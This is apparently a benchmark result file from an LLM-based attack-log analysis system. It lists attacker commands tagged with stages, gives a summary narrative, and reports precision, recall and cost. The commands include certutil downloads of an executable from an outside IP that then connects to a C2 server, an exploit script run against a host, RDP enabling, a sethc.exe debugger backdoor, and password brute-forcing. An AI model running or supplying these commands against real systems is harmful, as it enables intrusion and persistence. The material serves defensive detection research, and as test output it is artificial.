@@ -1,0 +1,84 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c \\\"python PhpStudyExp2.py http://121.36.30.176/ \\\\\\\"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\\\"\\",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\\\"Remote Desktop\\\" dir=in action=allow protocol=TCP localport=3389;reg query \\\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\";REG ADD \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\\" /v Debugger /t REG_SZ /d \\\"C:\\\\windows\\\\system32\\\\cmd.exe\\\\\" ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd /c nbtscan.exe 192.168.0.244/24",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"REG ADD \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\\" /v Debugger /t REG_SZ /d \\\"C:\\\\windows\\\\system32\\\\sethc.exe\\\" /f;REG query \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\\"\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd /c WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "A sophisticated multi-stage attack occurred, starting with initial access via a malicious executable download using `certutil`. The attackers escalated privileges through various commands executed via `PowerShell` and added new users, allowing for potential lateral movement. They established persistence by modifying registry settings, permitting Remote Desktop connections. Data discovery involved scanning nearby networks using `nbtscan`, while credential access attempts included brute-forcing an administration password using `WinBrute`. Throughout, defense evasion techniques were employed.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 16626,
+      "completion_tokens": 1875,
+      "total_tokens": 18501,
+      "wall_clock_s": 31.592,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.875,
+      "recall": 0.7777777777777778,
+      "f1": 0.823529411764706,
+      "tp": 7,
+      "fp": 1,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.5,
+      "recall": 0.6666666666666666,
+      "f1": 0.5714285714285715,
+      "tp": 4,
+      "fp": 4,
+      "fn": 2,
+      "recall_partial": 0.6666666666666666
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 16626,
+      "completion_tokens": 1875,
+      "total_tokens": 18501,
+      "wall_clock_s": 31.592,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
